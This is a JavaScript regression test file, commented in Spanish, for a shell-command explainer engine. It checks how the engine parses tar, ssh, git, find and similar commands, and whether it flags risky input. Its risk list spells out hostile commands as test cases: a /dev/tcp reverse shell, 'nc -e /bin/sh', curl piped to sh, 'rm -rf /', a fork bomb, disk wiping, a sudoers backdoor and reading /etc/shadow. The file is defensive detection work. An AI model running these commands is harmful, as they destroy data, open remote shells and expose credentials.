// Pruebas de regresión del motor: node tests/t_engine.js
const { createData } = require('../js/data.js');
const { createEngine } = require('../js/explain.js');
const data = createData();
let fail = 0, total = 0;
function ok(c, m) { total++; if (!c) { fail++; console.log('  FALLO:', m); } }

function walkUnits(tree, acc = []) {
  if (!tree) return acc;
  if (tree.kind === 'cmd') acc.push(tree.unit);
  for (const k of ['stages', 'items']) if (tree[k]) tree[k].forEach(s => walkUnits(s.node || s, acc));
  if (tree.seq) tree.seq.forEach(s => walkUnits(s.node, acc));
  for (const k of ['body', 'else', 'cond']) if (tree[k]) walkUnits(tree[k], acc);
  if (tree.branches) tree.branches.forEach(b => { walkUnits(b.cond, acc); walkUnits(b.body, acc); });
  if (tree.clauses) tree.clauses.forEach(c => walkUnits(c.body, acc));
  return acc;
}
const find = (u, text) => u.tokens.find(t => t.text === text);
const label = (t, i = 0) => t && t.items[i] && t.items[i].label;

(async () => {
  const eng = createEngine({ data, lang: 'es' });
  const R = async (s) => { const r = await eng.explain(s); r.us = r.units; r.ids = r.risks.map(x => x.id); return r; };
  const has = (r, id) => r.ids.includes(id);

  // --- estructura básica
  let r = await R('tar -xzvf backup.tgz -C /tmp');
  ok(!r.error && r.us[0].name === 'tar', 'tar básico');
  ok(find(r.us[0], '-xzvf').items.length === 4, 'tar: 4 opciones agrupadas');
  ok(find(r.us[0], 'backup.tgz').role === 'optarg', 'tar: valor de -f');
  ok(find(r.us[0], '/tmp').role === 'optarg', 'tar: valor de -C');
  r = await R('tar xzvf a.tgz');
  ok(find(r.us[0], 'xzvf').items.length === 4 && find(r.us[0], 'a.tgz').role === 'optarg', 'tar estilo BSD sin guion');
  r = await R('ps aux | grep nginx | grep -v grep');
  ok(r.us.length === 3 && r.us[0].name === 'ps', 'tubería de 3 etapas');
  ok(find(r.us[0], 'aux').items.length === 3, 'ps aux estilo BSD');
  r = await R('cp -r a b c /dest');
  ok(find(r.us[0], '/dest').items[0].label === 'DESTINO', 'cp: destino al final');
  ok(find(r.us[0], 'a').items[0].label === 'ORIGEN', 'cp: origen');
  r = await R('ls --almo');
  ok(label(find(r.us[0], '--almo')) === '--almost-all', 'opción larga abreviada --almo → --almost-all');
  r = await R('head -5 file');
  ok(find(r.us[0], '-5') && !find(r.us[0], '-5').unknown, 'head -5');
  r = await R('grep -e foo -e bar f.txt');
  ok(r.us[0].tokens.filter(t => t.role === 'optarg').length === 2, 'grep: dos -e');
  r = await R('cut -d: -f1,3 /etc/passwd');
  ok(find(r.us[0], '-d:') && find(r.us[0], '-d:').items[0].argText === ':', 'cut -d: con valor pegado');
  r = await R('ssh -p 2222 root@10.0.0.5 "uname -a"');
  ok(r.us.length === 2 && r.us[1].name === 'uname', 'ssh: comando remoto analizado');
  ok(r.effects.includes('net'), 'ssh: efecto net');
  r = await R('sudo -u www-data rm -rf /var/www/*');
  ok(r.us.some(u => u.name === 'rm') && find(r.us.find(u => u.name === 'rm'), '-rf').items.length === 2, 'sudo no se come las opciones de rm');
  r = await R('bash -c "ls -la /tmp && echo hi"');
  ok(r.us.filter(u => u.name).length >= 3, 'bash -c analiza el guion interno');
  r = await R('find /tmp -name "*.log" -exec rm {} \\;');
  ok(r.us.some(u => u.name === 'rm') && has(r, 'find-exec'), 'find -exec: comando interno y riesgo');
  r = await R('docker compose up -d');
  ok(r.us[0].display === 'docker compose up', 'subcomando de dos niveles');
  r = await R('ip -br addr show eth0');
  ok(r.us[0].display === 'ip address show', 'alias de subcomando addr → address');
  r = await R('git commit -am "x"');
  ok(r.us[0].display === 'git commit' && find(r.us[0], '-am').items.length === 2, 'git commit -am');
  r = await R('nmap -sS -T4 -p- 10.0.0.1');
  ok(find(r.us[0], '-sS') && !find(r.us[0], '-sS').unknown && find(r.us[0], '-p-'), 'nmap multi-letra');
  r = await R('dig +short MX example.com');
  ok(find(r.us[0], '+short').role === 'opt', 'dig +short');
  r = await R('echo $((1+2)) $HOME ~ {a,b}.txt *.c');
  const tk = r.us[0].tokens;
  ok(tk.length === 6, 'echo: 5 argumentos + comando');
  r = await R('cat <<EOF\nhola\nEOF');
  ok(r.us[0].tokens.some(t => t.role === 'redir'), 'here-doc');
  r = await R('for i in 1 2 3; do echo $i; done');
  ok(r.tree.items[0].node.kind === 'for', 'bucle for');
  r = await R('if [ -f a ]; then echo si; else echo no; fi');
  ok(r.tree.items[0].node.kind === 'if' && r.us.some(u => u.name === 'test' || u.name === '['), 'if con [ ]');
  r = await R('echo "abc');
  ok(!!r.error, 'error de sintaxis: comillas');
  r = await R('programa_inventado --x');
  ok(r.us[0].unknown, 'comando desconocido');

  // --- riesgos
  const risky = [
    ['rm -rf /', 'rm-root'], ['rm -rf --no-preserve-root /', 'nopreserve'], ['rm -rf ~', 'rm-root'], ['rm -rf $DIR/*', 'rm-var'], ['rm -rf build', 'rm-rf'],
    [':(){ :|:& };:', 'forkbomb'], ['curl -s http://x/a.sh | sh', 'pipe-to-shell'], ['curl http://x | sudo bash', 'pipe-to-shell'], ['wget -qO- http://x | bash', 'pipe-to-shell'],
    ['bash <(curl -s http://x)', 'exec-remote-subst'], ['echo aGk= | base64 -d | sh', 'obfuscated-exec'],
    ['dd if=/dev/zero of=/dev/sda bs=1M', 'dd-disk'], ['mkfs.ext4 /dev/sdb1', 'format'], ['chmod -R 777 /var/www', 'chmod-world-write'], ['chmod 4755 prog', 'chmod-suid'],
    ['bash -i >& /dev/tcp/10.0.0.5/4444 0>&1', 'devtcp'], ['nc -e /bin/sh 10.0.0.5 4444', 'nc-exec'], ['sudo echo x >> /etc/sudoers', 'sudo-redir'],
    ['echo "a ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers', 'persistence'], ['history -c', 'antiforensics'], ['cat /etc/shadow', 'secret-file'],
    ['iptables -F', 'fw-flush'], ['ufw disable', 'def-off'], ['crontab -r', 'crontab-r'], ['git push --force', 'git-force'], ['git reset --hard HEAD~1', 'git-reset-hard'],
    ['docker run --privileged -v /:/host alpine', 'docker-priv'], ['curl -k https://x', 'curl-k'], ['nmap -sS 10.0.0.1', 'offensive-nmap'], ['hydra -l a -P p ssh://h', 'offensive-hydra'],
    ['kill -9 -1', 'kill-init'], ['shutdown -h now', 'power'], ['python3 -m http.server 80', 'httpserver'], ['sudo -i', 'sudo-shell'], ['find / -name x -delete', 'find-delete'],
    ['usermod -aG sudo bob', 'priv-group'], ['ssh -o StrictHostKeyChecking=no h', 'ssh-nocheck'], ['export LD_PRELOAD=/tmp/x.so', 'envvar-LD_PRELOAD'],
  ];
  for (const [cmd, id] of risky) { const rr = await R(cmd); ok(has(rr, id), `riesgo «${id}» en: ${cmd} (salió: ${rr.ids.join(',') || 'nada'})`); }
  const safe = ['ls -la', 'cat file.txt | grep x', 'rm file.txt', 'chmod 644 a', 'git status', 'tar -tzf a.tgz', 'curl -s https://x -o out', 'echo hi > out.txt', 'cp a b', 'ping -c 3 8.8.8.8'];
  for (const cmd of safe) { const rr = await R(cmd); ok(!rr.risks.some(x => x.level === 'crit' || x.level === 'high'), `sin alertas graves en: ${cmd} (salió: ${rr.ids.join(',')})`); }

  // --- idioma
  const en = createEngine({ data, lang: 'en' });
  r = await en.explain('chmod 755 a.sh');
  ok(/owner|read/i.test(JSON.stringify(r.units[0].tokens)), 'inglés: chmod');
  const rr = await en.explain('rm -rf /');
  rr.us = rr.units;
  ok(rr.risks[0].level === 'crit' && /delet|Deletes/i.test(rr.risks[0].title + rr.risks[0].text), 'riesgo en inglés');

  // --- regex y sed
  const S = require('../js/special.js');
  const T = (es) => es;
  ok(S.explainRegex('^[a-z]+@\\d{2,3}$', 'pcre', T).length >= 6, 'regex pcre');
  ok(S.explainSed('s/a/b/g;/x/d', T, 'bre').length === 2, 'sed: dos órdenes');
  ok(S.explainMode('4755', T).special === 4, 'chmod: setuid');
  ok(S.explainMode('u+x,go-w', T).items.length === 2, 'chmod simbólico');

  console.log(fail ? `${fail} fallo(s) de ${total}` : `motor OK (${total} comprobaciones)`);
  process.exit(fail ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
